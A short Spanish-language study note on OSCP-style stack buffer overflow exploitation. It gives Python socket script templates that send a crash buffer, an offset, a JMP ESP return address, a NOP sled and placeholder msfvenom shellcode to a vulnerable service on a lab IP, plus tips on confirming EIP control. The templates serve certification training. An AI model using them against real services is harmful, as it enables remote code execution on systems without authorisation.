Durante el proceso de explotación BOF en OSCP, `python3` se usa para construir scripts que envían payloads personalizados a binarios vulnerables. Estos scripts permiten automatizar pruebas de crash, control de EIP, envío de shellcode y verificación final.

---

## Estructura básica del script

```python
#!/usr/bin/env python3
import socket

ip = "192.168.X.X"
port = 9999

payload = b"A" * 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload)
s.close()
```

---

## Variables típicas

```python
offset = 200
jmp_esp = b"\xaf\x11\x50\x62"  # dirección JMP ESP en little endian
nop_sled = b"\x90" * 16
shellcode = b""  # tu payload generado con msfvenom

payload = b"A" * offset + jmp_esp + nop_sled + shellcode
```

---

## Ejemplo completo (control de EIP y shellcode)

```python
import socket

ip = "192.168.1.100"
port = 9999

offset = 524
jmp_esp = b"\xf3\x12\x17\x31"  # dirección JMP ESP
nop_sled = b"\x90" * 16
shellcode = b"..."  # tu shellcode

payload = b"A" * offset + jmp_esp + nop_sled + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload)
s.close()
```

---

## Consideraciones OSCP

- Usa `b""` para definir strings en binario (Python 3 requirement)
- Añade control de errores con `try/except` si es necesario
- Prueba siempre primero sin shellcode para confirmar control de EIP

---
